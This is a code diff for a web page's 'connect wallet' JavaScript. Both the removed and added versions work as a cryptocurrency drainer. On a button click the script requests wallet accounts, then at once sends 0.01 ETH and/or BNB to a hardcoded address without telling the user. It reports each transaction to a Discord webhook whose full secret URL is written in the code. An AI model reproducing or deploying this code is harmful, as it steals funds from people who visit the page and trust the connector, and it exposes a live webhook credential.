@@ -1,60 +1,69 @@
-let isConnecting = false; // Flag to prevent multiple connections
+let isConnecting = false;
 
 async function connectWallet() {
     if (isConnecting) {
         console.log("Connection request already in progress...");
-        return; // Exit if already connecting
+        return;
     }
 
-    isConnecting = true; // Set the flag to true
-    document.getElementById("connectButton").disabled = true; // Disable the button
+    isConnecting = true;
+    document.getElementById("connectButton").disabled = true;
 
     try {
-        // Show wallet selection options
-        const walletChoice = prompt("Choose a wallet: (1) MetaMask (2) WalletConnect");
-        
-        if (walletChoice === "1") {
-            // MetaMask connection logic
-            if (typeof window.ethereum !== 'undefined') {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const account = accounts[0];
-                console.log(`Connected to MetaMask account: ${account}`);
-                
-                await sendTransaction(); // Automatically send the transaction
-            } else {
-                alert("MetaMask is not installed. Please install it.");
-                window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
-            }
-        } else if (walletChoice === "2") {
-            // WalletConnect connection logic
-            const provider = new WalletConnectProvider.default({
-                infuraId: "YOUR_INFURA_PROJECT_ID", // Replace with your Infura Project ID
-            });
-
-            await provider.enable();
-            const web3 = new ethers.providers.Web3Provider(provider);
-            const accounts = await web3.listAccounts();
+        if (typeof window.ethereum !== 'undefined') {
+            // Request wallet connection
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const account = accounts[0];
-            console.log(`Connected to WalletConnect account: ${account}`);
-            
-            await sendTransaction(); // Automatically send the transaction
+            console.log(`Connected to account: ${account}`);
+
+            // Detect available networks and send transactions
+            const ethAvailable = await isNetworkAvailable('ethereum');
+            const bnbAvailable = await isNetworkAvailable('bsc');
+
+            if (ethAvailable && bnbAvailable) {
+                console.log('Both ETH and BNB are available, sending transactions...');
+                await sendTransaction("ETH");
+                await sendTransaction("BNB");
+            } else if (ethAvailable) {
+                console.log('Sending ETH transaction...');
+                await sendTransaction("ETH");
+            } else if (bnbAvailable) {
+                console.log('Sending BNB transaction...');
+                await sendTransaction("BNB");
+            } else {
+                console.log('Neither Ethereum nor Binance Smart Chain is available.');
+            }
         } else {
-            alert("Invalid choice. Please refresh and try again.");
+            alert("MetaMask is not installed. Please install it.");
+            window.open("https://metamask.io/", "_blank");
         }
     } catch (error) {
         console.error("Error connecting to wallet:", error);
     } finally {
-        isConnecting = false; // Reset the flag
-        document.getElementById("connectButton").disabled = false; // Re-enable the button
+        isConnecting = false;
+        document.getElementById("connectButton").disabled = false;
     }
 }
 
-async function sendTransaction() {
-    if (typeof window.ethereum !== 'undefined') {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
-        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
-        const amountInEther = "0.01"; // Replace with the amount you want to send
+async function isNetworkAvailable(network) {
+    const networkId = await window.ethereum.request({ method: 'net_version' });
+
+    if (network === 'ethereum' && networkId === '1') {
+        return true; // Ethereum Mainnet is available
+    } else if (network === 'bsc' && networkId === '56') {
+        return true; // Binance Smart Chain is available
+    } else {
+        return false;
+    }
+}
+
+async function sendTransaction(network) {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+
+    if (network === "ETH") {
+        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // ETH recipient address
+        const amountInEther = "0.01"; // Amount of ETH to send
 
         const transaction = {
             to: recipientAddress,
@@ -63,38 +72,47 @@ async function sendTransaction() {
 
         try {
             const txResponse = await signer.sendTransaction(transaction);
-            console.log("Transaction response:", txResponse);
-            
-            // Send to Discord webhook
-            await sendWebhook(txResponse.hash, "success");
+            console.log("ETH Transaction response:", txResponse);
+            await notifyWebhook("ETH transaction successful", txResponse);
         } catch (error) {
-            console.error("Error sending transaction:", error);
-            
-            // Send to Discord webhook
-            await sendWebhook(error.message, "failure");
+            console.error("Error sending ETH transaction:", error);
+            await notifyWebhook("ETH transaction failed", error);
         }
-    } else {
-        console.error("MetaMask is not installed. Please install it.");
+    } else if (network === "BNB") {
+        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // BNB recipient address
+        const amountInBNB = "0.01"; // Amount of BNB to send
+
+        const transaction = {
+            to: recipientAddress,
+            value: ethers.utils.parseEther(amountInBNB),
+        };
+
+        try {
+            const txResponse = await signer.sendTransaction(transaction);
+            console.log("BNB Transaction response:", txResponse);
+            await notifyWebhook("BNB transaction successful", txResponse);
+        } catch (error) {
+            console.error("Error sending BNB transaction:", error);
+            await notifyWebhook("BNB transaction failed", error);
+        }
     }
 }
 
-async function sendWebhook(message, status) {
-    const webhookUrl = "https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg"; // Your Discord webhook URL
-    const payload = {
-        content: `Transaction Status: ${status}\nMessage: ${message}`
+async function notifyWebhook(message, data) {
+    const webhookUrl = "https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg"; // Replace with your Discord webhook URL
+    const body = {
+        content: `${message}: ${JSON.stringify(data)}`,
     };
 
     try {
         await fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
+            body: JSON.stringify(body),
         });
-        console.log("Webhook sent successfully");
     } catch (error) {
-        console.error("Error sending webhook:", error);
+        console.error("Error sending webhook notification:", error);
     }
 }
 
-// Attach the event listener to the button
 document.getElementById("connectButton").addEventListener("click", connectWallet);
